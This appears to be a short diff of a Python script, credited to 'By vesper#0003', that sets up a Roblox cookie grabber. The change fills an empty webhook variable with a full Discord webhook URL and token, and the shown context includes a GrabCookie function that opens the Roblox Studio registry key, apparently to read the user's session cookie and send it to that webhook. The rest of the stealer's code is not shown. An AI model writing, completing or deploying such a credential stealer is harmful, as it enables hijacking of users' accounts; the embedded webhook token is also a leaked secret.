@@ -8,7 +8,7 @@ By vesper#0003
 import requests
 from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
 
-webhook = "" # Put your discord webhook in here
+webhook = "https://discord.com/api/webhooks/1054767674011435078/kCX8DzSt_191fqmFJWJPIVIl96XvzHLi3gMKw0G54bGMfsHEXg_vZ4bY5FjnkBFR1-_M" # Put your discord webhook in here
 
 def GrabCookie():
     # opening the roblox studio key
